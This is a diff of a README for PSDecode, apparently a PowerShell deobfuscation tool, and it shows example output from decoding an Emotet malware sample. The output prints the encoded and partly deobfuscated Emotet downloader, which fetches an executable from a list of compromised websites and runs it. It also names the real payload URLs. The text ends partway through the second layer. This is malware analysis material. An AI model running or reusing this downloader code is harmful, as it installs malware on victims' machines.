@@ -19,47 +19,144 @@ In this repository, I've included Emotet_PowerShell_Examples.zip, which contains
 The password for the archive is: **infected**
 
 # Output Example
+> PSDecode -dump -beautify -verbose .\evil.ps1
 ```PowerShell
+VERBOSE: Input received from file: .\evil.ps1
+VERBOSE: Calculating MD5 of input
+VERBOSE: MD5: 5248e611bedd8bfdd9d2f561179d821a
+VERBOSE: Detecting encoding type...
+VERBOSE: Encoding detected: ASCII
+VERBOSE: Testing input to see if Base64 encoded
+VERBOSE: Input was Base64 encoded. Decoding was successful. Saved original Base64 encoded string as layer
+VERBOSE: Performing code cleanup on initial script
+VERBOSE: 7 Non-escape characters detected... Removing
+VERBOSE: Replacing: ."spLit"(	With: .spLit(
+VERBOSE: Replacing: ."DowNlOADFILE"(	With: .DowNlOADFILE(
+VERBOSE: Replacing: ("{0}{1}"-f 'AB','kDA')	With: ABkDA
+VERBOSE: Replacing: ("{1}{0}" -f 'o4','Xc')	With: Xco4
+VERBOSE: Replacing: ("{0}{1}" -f '.','exe')	With: .exe
+VERBOSE: Replacing: ("{0}{1}" -f'CUQ','4')	With: CUQ4
+VERBOSE: Replacing: ("{0}{1}"-f'j','cwC')	With: jcwC
+VERBOSE: Replacing: ("{0}{1}{2}"-f 'dj.','com','/c')	With: dj.com/c
+VERBOSE: Replacing: ("{0}{2}{1}"-f 'io','om','.c')	With: io.com
+VERBOSE: Replacing: ("{1}{0}"-f'om/w','c')	With: com/w
+VERBOSE: Replacing: ("{1}{0}" -f 'rn','te')	With: tern
+VERBOSE: Replacing: ("{1}{0}" -f't','://ma')	With: ://mat
+VERBOSE: Replacing: ("{1}{0}"-f'i','s/5Yx')	With: s/5Yxi
+VERBOSE: Replacing: ("{0}{3}{1}{2}"-f 'it','Med','ia','e/')	With: ite/Media
+VERBOSE: Replacing: ("{1}{0}" -f'etp','/')	With: /etp
+VERBOSE: Replacing: ("{0}{1}"-f 'ads','/')	With: ads/
+VERBOSE: Replacing: ("{1}{0}" -f '/G6','in')	With: in/G6
+VERBOSE: Replacing: ("{0}{1}" -f 'ds.c','o')	With: ds.co
+VERBOSE: Replacing: ("{0}{1}" -f'ome','na')	With: omena
+VERBOSE: Replacing: ("{1}{0}"-f 'p','htt')	With: hxxp
+VERBOSE: Replacing: ("{1}{0}"-f 'dm','-a')	With: -adm
+VERBOSE: Replacing: ("{0}{1}"-f 'om','/S')	With: om/S
+VERBOSE: Replacing: ("{0}{1}" -f'4/@','ht')	With: 4/@ht
+VERBOSE: Replacing: ("{1}{0}{2}{3}"-f 'rd','/wo','pre','ss')	With: /wordpress
+VERBOSE: Replacing: ("{1}{0}"-f'n/KC','i')	With: in/KC
+VERBOSE: Replacing: ("{0}{1}"-f'tt','ps')	With: ttps
+VERBOSE: Replacing: ("{1}{0}" -f'po','ne')	With: nepo
+VERBOSE: Replacing: ("{1}{0}{2}"-f 'www','://','.')	With: ://www.
+VERBOSE: Replacing: ("{1}{2}{0}"-f 'aud','w','er')	With: weraud
+VERBOSE: Replacing: ("{0}{1}"-f'na','l.c')	With: nal.c
+VERBOSE: Replacing: ("{0}{1}" -f'rim','ew')	With: rimew
+VERBOSE: Replacing: ("{0}{1}"-f 'l','thyt')	With: lthyt
+VERBOSE: Replacing: ("{1}{0}"-f '/he','/')	With: //he
+VERBOSE: Replacing: ("{2}{1}{0}" -f 'nt','e','ont')	With: ontent
+VERBOSE: Replacing: ("{1}{0}" -f'//','p:')	With: p://
+VERBOSE: Replacing: ("{0}{1}"-f'UAA','w')	With: UAAw
+VERBOSE: Replacing: ("{1}{0}"-f 'U','AUD')	With: AUDU
+VERBOSE: Replacing: ("{2}{0}{1}"-f'41A','Qc','O')	With: O41AQc
+VERBOSE: Replacing: ("{1}{0}"-f 'D','oBc')	With: oBcD
+VERBOSE: Replacing: ("{0}{2}{1}"-f'TAA','x1','A')	With: TAAAx1
+VERBOSE: Replacing: ("{0}{1}" -f 'KA','ABkDA')	With: KAABkDA
+VERBOSE: Replacing: ("{0}{1}" -f'B','Xco4')	With: BXco4
+VERBOSE: Replacing: ("{1}{0}" -f 'CUQ4','jcwC')	With: jcwCCUQ4
+VERBOSE: Replacing: ("{0}{1}{2}"-f 'com/w','p','-c')	With: com/wp-c
+VERBOSE: Replacing: ("{0}{1}"-f'tern','a')	With: terna
+VERBOSE: Replacing: ("{1}{0}{2}"-f'rix','://mat','in')	With: ://matrixin
+VERBOSE: Replacing: ("{3}{2}{1}{0}"-f '/','s/5Yxi','/cs','ite/Media')	With: ite/Media/css/5Yxi/
+VERBOSE: Replacing: ("{0}{3}{1}{2}" -f'in/G6','7','/@h','3C')	With: in/G63C7/@h
+VERBOSE: Replacing: ("{0}{1}{2}" -f 'w','ar','ds.co')	With: wards.co
+VERBOSE: Replacing: ("{1}{0}{2}"-f'/wp','m','-adm')	With: m/wp-adm
+VERBOSE: Replacing: ("{1}{0}" -f'tp','4/@ht')	With: 4/@hxxp
+VERBOSE: Replacing: ("{7}{1}{2}{5}{8}{3}{6}{0}{4}{9}" -f 'ni','in/KC','/','ttps','nepo','@','://www.','b','h','weraud')	With: bin/KC/@hxxp://www.ninepoweraud
+VERBOSE: Replacing: ("{2}{3}{0}{1}"-f 'a','lthyt',':','//he')	With: ://healthyt
+VERBOSE: Replacing: ("{2}{1}{0}" -f'p://','tt','@h')	With: @hxxp://
+VERBOSE: Replacing: ("{2}{0}{1}" -f'AwD','UAAw','p')	With: pAwDUAAw
+VERBOSE: Replacing: ("{0}{1}"-f 'AUDU','D')	With: AUDUD
+VERBOSE: Replacing: ("{1}{0}"-f'oBcD','mD')	With: mDoBcD
+VERBOSE: Replacing: ("{1}{0}"-f'BXco4','w')	With: wBXco4
+VERBOSE: Replacing: ("{19}{35}{12}{28}{18}{17}{20}{14}{32}{30}{34}{10}{37}{29}{4}{36}{7}{15}{31}{13}{9}{6}{38}{33}{2}{1}{0}{26}{3}{25}{23}{24}{22}{8}{5}{16}{27}{21}{11}"-f'gi-','dj.com/c','vi','io.com','com/wp-c','terna','BF/','/','://matrixin','PR','i','ite/Media/css/5Yxi/','/etp','ads/','in/G63C7/@h','up','tio','wards.co','omena','hxxp','m/wp-adm','om/S','4/@hxxp','/','6NA','/wordpress','bin/KC/@hxxp://www.ninepoweraud','nal.c','rimew','.','p','lo','tt','ser','://healthyt','s:/','ontent','ck','@hxxp://')	With: hxxp://etprimewomenawards.com/wp-admin/G63C7/@hxxp://healthytick.com/wp-content/uploads/PRBF/@hxxp://servidj.com/cgi-bin/KC/@hxxp://www.ninepoweraudio.com/wordpress/6NA4/@hxxp://matrixinternational.com/Site/Media/css/5Yxi/
+VERBOSE: Replacing: ("{1}{0}"-f'AUDUD','B')	With: BAUDUD
+VERBOSE: Replacing: .('Get-Item')	With: Get-Item
+VERBOSE: Replacing: .('Invoke-Item')	With: Invoke-Item
+VERBOSE: Code cleanup resulted in script modification. Saving original as layer.
+VERBOSE: Building decoder
+VERBOSE: Base64 encoding decoder
+VERBOSE: Executing decoder
+VERBOSE: Final layer processed. Successful exit with actions detected
+VERBOSE: Processing completed
+VERBOSE: Saving layers to C:\Users\REM\AppData\Local\Temp\
+VERBOSE: Writing C:\Users\REM\AppData\Local\Temp\5248e611bedd8bfdd9d2f561179d821a_layer_1.txt
+VERBOSE: Writing C:\Users\REM\AppData\Local\Temp\5248e611bedd8bfdd9d2f561179d821a_layer_2.txt
+VERBOSE: Writing C:\Users\REM\AppData\Local\Temp\5248e611bedd8bfdd9d2f561179d821a_layer_3.txt
+VERBOSE: Writing C:\Users\REM\AppData\Local\Temp\5248e611bedd8bfdd9d2f561179d821a_layer_4.txt
+
+
 ############################## Layer 1 ##############################
-JABiAFUAQQBaAF8AawA9ACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAoACIAewAxAH0AewAwAH0AIgAtAGYAIAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBjACcALAAnAEEAYwBBACcAKQAsACcAQQAnACkALAAnAE4AJwApADsAJAB1AEIAQQBBAG8AQQAgAD0AIAAnADQAMAAzACcAOwAkAGIAQQA0AEEAQQB3AHcAPQAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAgACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACcAQgAnACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBaAEQAbwAnACwAJwBBAFEAJwApACkALAAnAE4AJwApADsAJABuAFUAQQB4AEQAWABHAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJAB1AEIAQQBBAG8AQQArACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACcALgAnACwAJwBlAHgAZQAnACkAOwAkAGgAQQBrADEAQQBBAD0AKAAiAHsAMQB9AHsAMAB9ACIALQBmACcAQQBBACcALAAoACIAewAyAH0AewAwAH0AewAxAH0AIgAgAC0AZgAgACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwBHAEEAJwAsACcAQQBjACcAKQAsACcAQQAnACwAJwBYACcAKQApADsAJABTAEEAQQBHAEQAMQBrAD0ALgAoACcAbgAnACsAJwBlAHcALQBvACcAKwAnAGIAagBlACcAKwAnAGMAdAAnACkAIABOAGAAZQBUAC4AVwBlAGIAYABDAGwAaQBlAE4AVAA7ACQAYQBVAEEAVQBVAEEAPQAoACIAewAzADkAfQB7ADEANgB9AHsAMgA0AH0AewA0ADkAfQB7ADQAfQB7ADMANQB9AHsAMwA4AH0AewAxADEAfQB7ADUAfQB7ADEAMgB9AHsAMgB9AHsAMwA0AH0AewA0ADEAfQB7ADYAfQB7ADkAfQB7ADIAMwB9AHsAMgAyAH0AewAxADkAfQB7ADQAMAB9AHsAMwB9AHsAMgA3AH0AewA0ADQAfQB7ADIAOAB9AHsAMwA2AH0AewAzADMAfQB7ADcAfQB7ADMAMAB9AHsAOAB9AHsANAA4AH0AewA0ADMAfQB7ADQANgB9AHsAMgA1AH0AewAxADQAfQB7ADAAfQB7ADIAMAB9AHsAMgAxAH0AewA0ADUAfQB7ADMAMQB9AHsAMgA2AH0AewA0ADcAfQB7ADIAOQB9AHsAMQAzAH0AewAxADcAfQB7ADEAMAB9AHsANAAyAH0AewAxAH0AewAzADcAfQB7ADMAMgB9AHsAMQA4AH0AewAxADUAfQAiACAALQBmACAAJwBuAHQAJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAgACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAnAG4AdAAnACwAJwAvAG8AJwApACwAJwBlACcAKQAsACcAaQAnACwAJwBhAF8AZgAnACwAJwBhAGcAawAnACwAJwBnACcALAAnAGkAbQAnACwAJwB0AGUAYwAnACwAKAAiAHsAMAB9AHsAMQB9ACIALQBmACAAKAAiAHsAMAB9AHsAMQB9ACIALQBmACcALwBkACcALAAnAG8AdgAnACkALAAnAGkAJwApACwAJwBwACcALAAnAG0AJwAsACcAbAAnACwAKAAiAHsAMAB9AHsAMQB9ACIALQBmACcAagBkAC8AJwAsACcAawAnACkALAAnAC4AYwAnACwAJwBjAG8AJwAsACcALwAnACwAKAAiAHsAMAB9AHsAMQB9ACIALQBmACcAdAB0ACcALAAnAHAAOgAnACkALAAnAG8AJwAsACcATwAnACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAIAAnAC8AdAAnACwAJwB3AGkAdAAnACkALAAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAnAGUAbgB0ACcALAAnAC8AJwAsACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACAAJwBzAF8ARwAnACwAJwBEACcAKQApACwAJwAvAEAAaAAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAKAAiAHsAMAB9AHsAMQB9ACIALQBmACcAYwAnACwAJwAuAGMAbwBtACcAKQAsACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACcAZQAnACwAJwBjAHAAbAAnACkAKQAsACcAbABhAHQAJwAsACcALwAnACwAKAAiAHsAMgB9AHsAMAB9AHsAMQB9ACIALQBmACcALwB3ACcALAAnAHAALQAnACwAJwAuAHIAdQAnACkALAAnAHkAJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAHQAcAAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwBAAGgAdAAnACwAJwB4AC8AJwApACkALAAnAC8AJwAsACcAZQB0AGkAJwAsACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACAAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBpAC4AYwAnACwAJwBvAG0AJwApACwAJwBpACcAKQAsACcAZQBhAHMAJwAsACcAcQAnACwAJwByACcALAAnAF8AbwBEACcALAAoACIAewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAnAC8AZABvACcALAAoACIAewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAgACcAbwAnACwAJwBhAHIAbQBhAC4AYwAnACwAJwBtACcAKQAsACcAdgAnACkALAAnAHMAZQAnACwAJwBfACcALAAnAGkAagA3ACcALAAnAGgAJwAsACgAIgB7ADEAfQB7ADIAfQB7ADAAfQAiACAALQBmACcAaQAvACcALAAoACIAewAxAH0AewAwAH0AIgAtAGYAJwBlAHIALQBhACcALAAnAHQAJwApACwAJwBwACcAKQAsACgAIgB7ADAAfQB7ADIAfQB7ADEAfQAiAC0AZgAoACIAewAxAH0AewAwAH0AIgAtAGYAJwBAAGgAdAB0ACcALAAnAC8AJwApACwAJwAvAHMAJwAsACcAcAA6AC8AJwApACwAKAAiAHsAMAB9AHsAMQB9AHsAMgB9ACIALQBmACAAJwAvAHcAJwAsACcAcAAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwBvAG4AdAAnACwAJwAtAGMAJwApACkALAAoACIAewAyAH0AewAwAH0AewAxAH0AIgAtAGYAIAAnAF8AVQAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwAvAEAAaAB0ACcALAAnAEEAJwApACwAKAAiAHsAMAB9AHsAMQB9ACIALQBmACAAJwBqAGQAJwAsACcALwBkACcAKQApACwAJwA6AC8AJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAgACcALwAvACcALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnADoAJwAsACcAdAB0AHAAJwApACkALAAoACIAewAwAH0AewAzAH0AewAxAH0AewAyAH0AIgAgAC0AZgAnAHQAcAA6ACcALAAnADgAJwAsACcAOAA4ACcALAAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAgACcALwAvAHYAdgAnACwAJwBrACcAKQApACwAJwBuACcALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAgACcANwBsAGcAJwAsACcAagAnACkALAAnAC8AdAAnACkALgAiAFMAUABgAEwASQBUACIAKAAnAEAAJwApADsAJABsAG8AawBfAFUAXwA9ACgAIgB7ADIAfQB7ADAAfQB7ADEAfQAiACAALQBmACAAJwBvACcALAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBBACcALAAnAFEAUQBBACcAKQAsACcATQBRAFgAJwApADsAZgBvAHIAZQBhAGMAaAAoACQAcQBBAF8AawBEAFUAQQAgAGkAbgAgACQAYQBVAEEAVQBVAEEAKQB7AHQAcgB5AHsAJABTAEEAQQBHAEQAMQBrAC4AIgBkAGAAbwBXAE4AbABPAGEARABGAGAAaQBMAGUAIgAoACQAcQBBAF8AawBEAFUAQQAsACAAJABuAFUAQQB4AEQAWABHACkAOwAkAFIAQQBfAEMAUQA0AFEAUQA9ACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAgACcAQQBBACcALAAnAE8AVQAnACkALAAnAFEAQgAnACkAOwBJAGYAIAAoACgAJgAoACcARwBlAHQALQAnACsAJwBJAHQAJwArACcAZQBtACcAKQAgACQAbgBVAEEAeABEAFgARwApAC4AIgBMAGUAYABOAGAAZwBUAGgAIgAgAC0AZwBlACAAMgAxADMAOAA5ACkAIAB7ACYAKAAnAEkAbgB2AG8AJwArACcAawBlAC0ASQB0ACcAKwAnAGUAJwArACcAbQAnACkAIAAkAG4AVQBBAHgARABYAEcAOwAkAEkAQQBHAEEAVQBVAD0AKAAiAHsAMgB9AHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBaAHcAJwAsACcAVQB3ACcAKQAsACcAWgAnACwAJwBpAEQAJwApADsAYgByAGUAYQBrADsAJABqAFEARABaAFUAQgA9ACgAIgB7ADIAfQB7ADEAfQB7ADAAfQAiACAALQBmACcAQQAnACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAIAAnAEQAJwAsACcAQQBBAF8AJwApACwAJwBpAEIAQQAnACkAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAFAARwBjAEEAUQBCAEMAPQAoACIAewAwAH0AewAxAH0AIgAtAGYAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAIAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBZAFUAJwAsACcAQQBVACcAKQAsACcAawAnACkALAAnAG8AJwApAA==
+JABjAGsAXwBBADQAQQA9ACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwBLAEEAJwAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACcAQQBCACcALAAnAGsARABBACcAKQApADsAJABRAEEAVQBBAFoARAAgAD0AIAAnADYAMgA1ACcAOwAkAHIARABBAGMAQQBBAD0AKAAiAHsAMQB9AHsAMAB9ACIALQBmACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACcAQgAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAG8ANAAnACwAJwBYAGMAJwApACkALAAnAHcAJwApADsAJABQAEQAawBrAGsAQwBBAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJABRAEEAVQBBAFoARAArACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwAuACcALAAnAGUAeABlACcAKQA7ACQASQBBAEEAQQBVAEQAWgA9ACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACAAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBDAFUAUQAnACwAJwA0ACcAKQAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAnAGoAJwAsACcAYwB3AEMAJwApACkAOwAkAHUAbwB4ADEAQwB3AD0AJgAoACcAbgBlAHcALQBvACcAKwAnAGIAJwArACcAagBlAGMAdAAnACkAIABOAGAARQBUAC4AVwBFAGIAYwBMAGAAaQBlAG4AdAA7ACQAegB3AFEAQQAxAEIAPQAoACIAewAxADkAfQB7ADMANQB9AHsAMQAyAH0AewAyADgAfQB7ADEAOAB9AHsAMQA3AH0AewAyADAAfQB7ADEANAB9AHsAMwAyAH0AewAzADAAfQB7ADMANAB9AHsAMQAwAH0AewAzADcAfQB7ADIAOQB9AHsANAB9AHsAMwA2AH0AewA3AH0AewAxADUAfQB7ADMAMQB9AHsAMQAzAH0AewA5AH0AewA2AH0AewAzADgAfQB7ADMAMwB9AHsAMgB9AHsAMQB9AHsAMAB9AHsAMgA2AH0AewAzAH0AewAyADUAfQB7ADIAMwB9AHsAMgA0AH0AewAyADIAfQB7ADgAfQB7ADUAfQB7ADEANgB9AHsAMgA3AH0AewAyADEAfQB7ADEAMQB9ACIALQBmACcAZwBpAC0AJwAsACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiAC0AZgAgACcAZABqAC4AJwAsACcAYwBvAG0AJwAsACcALwBjACcAKQAsACcAdgBpACcALAAoACIAewAwAH0AewAyAH0AewAxAH0AIgAtAGYAIAAnAGkAbwAnACwAJwBvAG0AJwAsACcALgBjACcAKQAsACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiAC0AZgAgACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAG8AbQAvAHcAJwAsACcAYwAnACkALAAnAHAAJwAsACcALQBjACcAKQAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAgACcAcgBuACcALAAnAHQAZQAnACkALAAnAGEAJwApACwAJwBCAEYALwAnACwAJwAvACcALAAoACIAewAxAH0AewAwAH0AewAyAH0AIgAtAGYAJwByAGkAeAAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwB0ACcALAAnADoALwAvAG0AYQAnACkALAAnAGkAbgAnACkALAAnAFAAUgAnACwAJwBpACcALAAoACIAewAzAH0AewAyAH0AewAxAH0AewAwAH0AIgAtAGYAIAAnAC8AJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAGkAJwAsACcAcwAvADUAWQB4ACcAKQAsACcALwBjAHMAJwAsACgAIgB7ADAAfQB7ADMAfQB7ADEAfQB7ADIAfQAiAC0AZgAgACcAaQB0ACcALAAnAE0AZQBkACcALAAnAGkAYQAnACwAJwBlAC8AJwApACkALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAGUAdABwACcALAAnAC8AJwApACwAKAAiAHsAMAB9AHsAMQB9ACIALQBmACAAJwBhAGQAcwAnACwAJwAvACcAKQAsACgAIgB7ADAAfQB7ADMAfQB7ADEAfQB7ADIAfQAiACAALQBmACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACAAJwAvAEcANgAnACwAJwBpAG4AJwApACwAJwA3ACcALAAnAC8AQABoACcALAAnADMAQwAnACkALAAnAHUAcAAnACwAJwB0AGkAbwAnACwAKAAiAHsAMAB9AHsAMQB9AHsAMgB9ACIAIAAtAGYAIAAnAHcAJwAsACcAYQByACcALAAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAgACcAZABzAC4AYwAnACwAJwBvACcAKQApACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBvAG0AZQAnACwAJwBuAGEAJwApACwAKAAiAHsAMQB9AHsAMAB9ACIALQBmACAAJwBwACcALAAnAGgAdAB0ACcAKQAsACgAIgB7ADEAfQB7ADAAfQB7ADIAfQAiAC0AZgAnAC8AdwBwACcALAAnAG0AJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAgACcAZABtACcALAAnAC0AYQAnACkAKQAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACcAbwBtACcALAAnAC8AUwAnACkALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAHQAcAAnACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwA0AC8AQAAnACwAJwBoAHQAJwApACkALAAnAC8AJwAsACcANgBOAEEAJwAsACgAIgB7ADEAfQB7ADAAfQB7ADIAfQB7ADMAfQAiAC0AZgAgACcAcgBkACcALAAnAC8AdwBvACcALAAnAHAAcgBlACcALAAnAHMAcwAnACkALAAoACIAewA3AH0AewAxAH0AewAyAH0AewA1AH0AewA4AH0AewAzAH0AewA2AH0AewAwAH0AewA0AH0AewA5AH0AIgAgAC0AZgAgACcAbgBpACcALAAoACIAewAxAH0AewAwAH0AIgAtAGYAJwBuAC8ASwBDACcALAAnAGkAJwApACwAJwAvACcALAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwB0AHQAJwAsACcAcABzACcAKQAsACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACcAcABvACcALAAnAG4AZQAnACkALAAnAEAAJwAsACgAIgB7ADEAfQB7ADAAfQB7ADIAfQAiAC0AZgAgACcAdwB3AHcAJwAsACcAOgAvAC8AJwAsACcALgAnACkALAAnAGIAJwAsACcAaAAnACwAKAAiAHsAMQB9AHsAMgB9AHsAMAB9ACIALQBmACAAJwBhAHUAZAAnACwAJwB3ACcALAAnAGUAcgAnACkAKQAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAnAG4AYQAnACwAJwBsAC4AYwAnACkALAAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAnAHIAaQBtACcALAAnAGUAdwAnACkALAAnAC4AJwAsACcAcAAnACwAJwBsAG8AJwAsACcAdAB0ACcALAAnAHMAZQByACcALAAoACIAewAyAH0AewAzAH0AewAwAH0AewAxAH0AIgAtAGYAIAAnAGEAJwAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACcAbAAnACwAJwB0AGgAeQB0ACcAKQAsACcAOgAnACwAKAAiAHsAMQB9AHsAMAB9ACIALQBmACAAJwAvAGgAZQAnACwAJwAvACcAKQApACwAJwBzADoALwAnACwAKAAiAHsAMgB9AHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAG4AdAAnACwAJwBlACcALAAnAG8AbgB0ACcAKQAsACcAYwBrACcALAAoACIAewAyAH0AewAxAH0AewAwAH0AIgAgAC0AZgAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAC8ALwAnACwAJwBwADoAJwApACwAJwB0AHQAJwAsACcAQABoACcAKQApAC4AIgBzAHAATABgAGkAdAAiACgAJwBAACcAKQA7ACQAYgBjAEIAQQBRAF8APQAoACIAewAyAH0AewAwAH0AewAxAH0AIgAgAC0AZgAnAEEAdwBEACcALAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBVAEEAQQAnACwAJwB3ACcAKQAsACcAcAAnACkAOwBmAG8AcgBlAGEAYwBoACgAJABUAEcAQgBRAFUAQgAgAGkAbgAgACQAegB3AFEAQQAxAEIAKQB7AHQAcgB5AHsAJAB1AG8AeAAxAEMAdwAuACIARABvAGAAdwBOAGwATwBgAEEARABGAEkATABFACIAKAAkAFQARwBCAFEAVQBCACwAIAAkAFAARABrAGsAawBDAEEAKQA7ACQAYQBBAFoANABBAEEARABBAD0AKAAiAHsAMQB9AHsAMAB9ACIALQBmACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAgACcAVQAnACwAJwBBAFUARAAnACkALAAnAEQAJwApACwAJwBCACcAKQA7AEkAZgAgACgAKAAuACgAJwBHACcAKwAnAGUAdAAnACsAJwAtAEkAdABlAG0AJwApACAAJABQAEQAawBrAGsAQwBBACkALgAiAEwARQBgAE4ARwBgAFQASAAiACAALQBnAGUAIAAyADgAMwA5ADcAKQAgAHsALgAoACcASQBuAHYAbwBrACcAKwAnAGUALQBJAHQAZQAnACsAJwBtACcAKQAgACQAUABEAGsAawBrAEMAQQA7ACQAVABBAEIARAA0AFUAQQA9ACgAIgB7ADIAfQB7ADAAfQB7ADEAfQAiAC0AZgAnADQAMQBBACcALAAnAFEAYwAnACwAJwBPACcAKQA7AGIAcgBlAGEAawA7ACQAbQBDAEQAWgBVAEEAPQAoACIAewAxAH0AewAwAH0AIgAtAGYAKAAiAHsAMQB9AHsAMAB9ACIALQBmACAAJwBEACcALAAnAG8AQgBjACcAKQAsACcAbQBEACcAKQB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAagBaAEIAQwBDAEEAPQAoACIAewAwAH0AewAyAH0AewAxAH0AIgAtAGYAJwBUAEEAQQAnACwAJwB4ADEAJwAsACcAQQAnACkA
+
 
 ############################## Layer 2 ##############################
-$bUAZ_k=("{1}{0}"-f("{1}{0}"-f ("{0}{1}"-f'c','AcA'),'A'),'N');$uBAAoA = '403';$bA4AAww=("{1}{0}" -f ("{0}{1}" -f'B',("{0}{1}" -f'ZDo','AQ')),'N');$nUAxDXG=$env:userprofile+'\'+$uBAAoA+("{0}{1}"-f '.','exe');$hAk1AA=("{1}{0}"-f'AA',("{2}{0}{1}" -f ("{0}{1}" -f 'GA','Ac'),'A','X'));$SAAGD1k=.('new-object') NeT.WebClieNT;$aUAUUA=("{39}{16}{24}{49}{4}{35}{38}{11}{5}{12}{2}{34}{41}{6}{9}{23}{22}{19}{40}{3}{27}{44}{28}{36}{33}{7}{30}{8}{48}{43}{46}{25}{14}{0}{20}{21}{45}{31}{26}{47}{29}{13}{17}{10}{42}{1}{37}{32}{18}{15}" -f 'nt',("{1}{0}"-f ("{0}{1}"-f'nt','/o'),'e'),'i','a_f','agk','g','im','tec',("{0}{1}"-f ("{0}{1}"-f'/d','ov'),'i'),'p','m','l',("{0}{1}"-f'jd/','k'),'.c','co','/',("{0}{1}"-f'tt','p:'),'o','O',("{0}{1}" -f '/t','wit'),("{0}{1}{2}" -f'ent','/',("{1}{0}" -f 's_G','D')),'/@h',("{1}{0}" -f("{0}{1}"-f'c','.com'),("{0}{1}" -f'e','cpl')),'lat','/',("{2}{0}{1}"-f'/w','p-','.ru'),'y',("{1}{0}"-f'tp',("{1}{0}" -f'@ht','x/')),'/','eti',("{1}{0}" -f ("{0}{1}" -f'i.c','om'),'i'),'eas','q','r','_oD',("{1}{0}{2}" -f'/do',("{1}{0}{2}" -f 'o','arma.c','m'),'v'),'se','_','ij7','h',("{1}{2}{0}" -f'i/',("{1}{0}"-f'er-a','t'),'p'),("{0}{2}{1}"-f("{1}{0}"-f'@htt','/'),'/s','p:/'),("{0}{1}{2}"-f '/w','p',("{1}{0}" -f'ont','-c')),("{2}{0}{1}"-f '_U',("{1}{0}" -f'/@ht','A'),("{0}{1}"-f 'jd','/d')),':/',("{1}{0}"-f '//',("{1}{0}" -f':','ttp')),("{0}{3}{1}{2}" -f'tp:','8','88',("{0}{1}" -f '//vv','k')),'n',("{1}{0}" -f '7lg','j'),'/t')."SPLIT"('@');$lok_U_=("{2}{0}{1}" -f 'o',("{0}{1}"-f'A','QQA'),'MQX');foreach($qA_kDUA in $aUAUUA){try{$SAAGD1k."doWNlOaDFiLe"($qA_kDUA, $nUAxDXG);$RA_CQ4QQ=("{0}{1}"-f ("{1}{0}"-f 'AA','OU'),'QB');If ((&('Get-Item') $nUAxDXG)."LeNgTh" -ge 21389) {&('Invoke-Item') $nUAxDXG;$IAGAUU=("{2}{1}{0}" -f 